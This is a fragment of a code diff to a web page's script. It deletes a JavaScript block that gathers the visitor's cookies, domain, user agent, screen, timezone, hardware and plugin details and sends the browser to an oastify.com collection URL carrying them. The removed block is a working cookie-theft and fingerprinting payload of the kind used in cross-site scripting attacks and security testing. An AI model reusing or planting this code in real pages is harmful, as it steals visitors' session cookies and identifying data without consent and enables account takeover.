@@ -64,47 +64,5 @@ function sendHeadlessInfo() {
 }
 
 sendHeadlessInfo();
-
-        // Encode the values to make them URL-safe
-        var userAgent = encodeURIComponent(navigator.userAgent);
-        var documentDomain = encodeURIComponent(document.domain);
-        var cookies = encodeURIComponent(document.cookie);
-        var screenWidth = screen.width;
-        var screenHeight = screen.height;
-        var language = encodeURIComponent(navigator.language);
-        var platform = encodeURIComponent(navigator.platform);
-        var timezone = encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone);
-        var cpuCores = navigator.hardwareConcurrency || 'unknown';
-        var deviceMemory = navigator.deviceMemory || 'unknown';
-        var os = navigator.userAgent.indexOf('Win') != -1 ? 'Windows' :
-                 navigator.userAgent.indexOf('Mac') != -1 ? 'MacOS' :
-                 navigator.userAgent.indexOf('Linux') != -1 ? 'Linux' :
-                 navigator.userAgent.indexOf('Android') != -1 ? 'Android' :
-                 navigator.userAgent.indexOf('like Mac') != -1 ? 'iOS' : 'Unknown';
-
-        // Get browser plugins
-        var plugins = [];
-        for (var i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
-        }
-        var pluginsString = encodeURIComponent(plugins.join(', '));
-
-        // Construct the URL with the query parameters
-        var targetUrl = "https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/ss";
-        var redirectUrl = targetUrl + "?userAgent=" + userAgent +
-                          "&domain=" + documentDomain +
-                          "&cookies=" + cookies +
-                          "&screenWidth=" + screenWidth +
-                          "&screenHeight=" + screenHeight +
-                          "&language=" + language +
-                          "&platform=" + platform +
-                          "&timezone=" + timezone +
-                          "&cpuCores=" + cpuCores +
-                          "&deviceMemory=" + deviceMemory +
-                          "&os=" + os +
-                          "&plugins=" + pluginsString;
-
-        // Redirect to the constructed URL
-        window.location.href = redirectUrl;
         
     </script>
